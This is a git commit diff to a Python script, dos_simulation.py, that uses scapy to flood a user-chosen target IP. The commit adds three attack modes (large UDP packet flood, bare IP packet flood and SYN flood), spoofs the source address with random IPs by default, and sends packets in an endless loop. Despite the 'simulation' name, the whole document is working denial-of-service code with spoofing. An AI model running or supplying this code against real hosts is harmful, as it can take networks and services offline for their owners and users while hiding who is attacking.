b1b9cddb8e092cc202f13759e10921ab11ee6850
Ponleou Keo Sok <ponleousk@gmail.com>
2024-05-17 10:36:23 +0700

    feat: added multiple dos flood types

--- dos_simulation.py
+++ dos_simulation.py
@@ -1,23 +1,42 @@
 import scapy.all as scp
+import random
+
+MAX_PORT = 65535
 
 ip_src = input("Fake Source IP (blank for your IP): ")
 ip_dst = input("Target IP: ")
 
-pkg_size = input("packet Size (blank for max): ")
+attack_type = input(
+    "1. Heavy packet flood \n2. Light packet flood \n3. SYN flood \nAttack Type (default 1):"
+)
+
+pkg_size = 0
+if not (attack_type == "2") and not (attack_type == "3"):
+    pkg_size = input("Packet Size (blank for max): ")
+
+if not (pkg_size):
+    pkg_size = MAX_PORT - 535
 
 
 def dos_simulation(ip_src, ip_dst, pkg_size):
-    if not (pkg_size):
-        pkg_size = 65000
 
-    ip_layer = scp.IP(dst=ip_dst)
+    ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)
+
     if ip_src:
-        ip_layer = scp.IP(src=ip_src, dst=ip_dst)
+        ip_layer.src = ip_src
 
     udp_layer = scp.UDP(sport=80, dport=21)
     raw_layer = scp.Raw(int(pkg_size))
 
     packet = ip_layer / udp_layer / raw_layer
+    if attack_type == "2":
+        packet = ip_layer
+
+    if attack_type == "3":
+        tcp_layer = scp.TCP(
+            sport=80, dport=21, seq=random.randint(0, MAX_PORT), flags="S"
+        )
+        packet = ip_layer / tcp_layer
 
     scp.send(packet, loop=1)
     print(packet)
